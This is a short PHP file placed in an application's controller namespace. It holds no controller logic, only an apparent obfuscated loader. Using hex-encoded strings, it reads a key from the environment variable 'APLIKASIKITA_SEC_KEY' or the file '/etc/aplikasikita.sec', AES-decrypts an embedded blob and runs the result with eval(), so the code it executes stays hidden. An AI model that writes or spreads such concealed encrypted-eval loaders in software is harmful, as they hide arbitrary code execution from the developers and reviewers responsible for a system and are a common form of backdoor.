<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('lhpUkPRailZDJDEK89J2jw==');

$c=base64_decode(

'ZzGEjlSnppQA9yT2626zMoFwY2Z9DUYTZceZK4J3E21rOWS1cuAZNQctug1VubheArrPwx4ZIoyO' .
'zv7WaLmn1wh6AZeitIqQ6QXmuv3hpTPFUeOApTRWPWInR7B17OEyFmhDcPfzAcFkJO8GyGFAm5nh' .
'o0YmOSe9/wBxxuoQv5occ1J0IyjbzjrfiueMv/6tmaNYdtTcet0HBimLw+8SDThv06p/vHL127uZ' .
'dB1ipqZ21iiMimIvXs3x9xOaBNt8'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

